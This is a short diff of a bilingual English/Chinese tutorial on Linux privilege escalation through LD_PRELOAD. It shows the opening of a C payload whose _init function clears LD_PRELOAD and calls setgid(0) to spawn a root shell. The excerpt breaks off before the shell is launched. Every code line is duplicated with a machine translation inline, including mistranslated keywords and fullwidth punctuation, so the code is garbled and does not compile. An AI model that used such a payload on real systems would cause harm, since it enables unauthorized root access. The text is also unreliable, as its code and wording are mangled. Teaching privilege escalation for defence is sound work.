@@ -186,11 +186,11 @@ The steps of this privilege escalation vector can be summarized as follows;
 
 The C code will simply spawn a root shell and can be written as follows;  
 C 代码将简单地生成一个根 shell，可以写成如下;
-
+```c
 #include <stdio.h> #include < stdio.h>  
 #include <sys/types.h> #include < sys/types.h>  
 #include <stdlib.h> #include < stdlib.h>  
-  
+```
 void _init() { 无效 _init（） {  
 unsetenv("LD_PRELOAD"); unsetenv（“LD_PRELOAD”）;  
 setgid(0); setgid（0）;  
